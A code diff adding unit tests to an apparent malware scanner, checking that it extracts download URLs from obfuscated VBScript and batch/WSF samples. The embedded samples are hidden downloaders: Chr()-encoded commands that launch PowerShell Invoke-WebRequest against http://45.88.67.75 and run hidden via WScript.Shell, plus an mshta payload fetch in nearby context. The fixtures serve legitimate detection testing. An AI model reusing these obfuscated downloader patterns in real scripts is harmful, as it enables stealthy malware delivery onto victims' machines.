@@ -15507,6 +15507,94 @@ sh.Run cmd, 0, False"#;
     }
 
     #[test]
+    fn vbs_wscript_shell_run_self_accumulated_chr_command_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim pdf, GG
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(109)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(119)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(104)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(73)
+pdf = pdf + Chr(110)
+pdf = pdf + Chr(118)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(107)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(87)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(98)
+pdf = pdf + Chr(82)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(113)
+pdf = pdf + Chr(117)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(85)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(105)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(58)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(52)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(54)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(97)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+GG = "%Temp%" + "\google.vbs"
+CreateObject("WScript.Shell").Run pdf + GG, 0, True"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://45.88.67.75/pdf/a.pdf"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS self-accumulated Chr command: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn standalone_vbs_shell_run_chr_concat_url_extracted() {
         let vbs = br#"Dim cmd
 cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta"
@@ -15530,6 +15618,101 @@ sh.Run cmd, 0, False"#;
             ),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn batch_wsf_vbscript_accumulated_chr_command_url_extracted() {
+        let script = br#"<!-- : batch portion
+@echo off
+cscript /nologo "%~f0?.wsf"
+goto :EOF
+: VBScript -->
+<job>
+<script language="VBScript">
+Dim pdf, GG
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(109)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(99)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(119)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(104)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(108)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(73)
+pdf = pdf + Chr(110)
+pdf = pdf + Chr(118)
+pdf = pdf + Chr(111)
+pdf = pdf + Chr(107)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(87)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(98)
+pdf = pdf + Chr(82)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(113)
+pdf = pdf + Chr(117)
+pdf = pdf + Chr(101)
+pdf = pdf + Chr(115)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(45)
+pdf = pdf + Chr(85)
+pdf = pdf + Chr(114)
+pdf = pdf + Chr(105)
+pdf = pdf + Chr(32)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(116)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(58)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(52)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(56)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(54)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(55)
+pdf = pdf + Chr(53)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+pdf = pdf + Chr(47)
+pdf = pdf + Chr(97)
+pdf = pdf + Chr(46)
+pdf = pdf + Chr(112)
+pdf = pdf + Chr(100)
+pdf = pdf + Chr(102)
+GG = "%Temp%" + "\google.vbs"
+CreateObject("WScript.Shell").Run pdf + GG, 0, True
+</script>
+</job>"#;
+        let report = analyze(script, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://45.88.67.75/pdf/a.pdf"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from batch WSF embedded VBS Chr accumulator: {:?}",
+            report.traits
         );
     }
 
